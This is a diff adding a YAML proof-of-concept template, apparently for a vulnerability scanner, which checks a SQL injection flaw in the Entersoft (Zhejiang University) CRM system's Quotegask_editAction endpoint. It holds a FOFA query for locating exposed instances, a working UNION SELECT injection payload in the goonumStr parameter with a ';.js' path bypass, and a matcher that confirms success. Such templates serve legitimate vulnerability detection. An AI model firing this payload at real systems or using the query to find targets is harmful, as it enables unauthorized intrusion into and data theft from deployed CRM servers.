@@ -1,0 +1,17 @@
+id: poc-yaml-entersoft-quotegask-editaction-sqli
+info:
+  name: 浙大恩特客户资源管理系统 Quotegask_editAction SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 浙大恩特客户资源管理系统
+  fofa: title="欢迎使用浙大恩特客户资源管理系统"
+variables:
+  t1: random_int(100,1000)
+  t2: t1 * t1
+requests:
+- method: GET
+  path: /entsoft/Quotegask_editAction.entweb;.js?goonumStr=1')+UNION+ALL+SELECT+{{.t1}}*{{.t1}}--+&method=goonumIsExist
+  expression: status_code == 200 && contains(body,"\"result\":true") && contains(body,t2)
+    && !contains(body,"<")
+transport: http
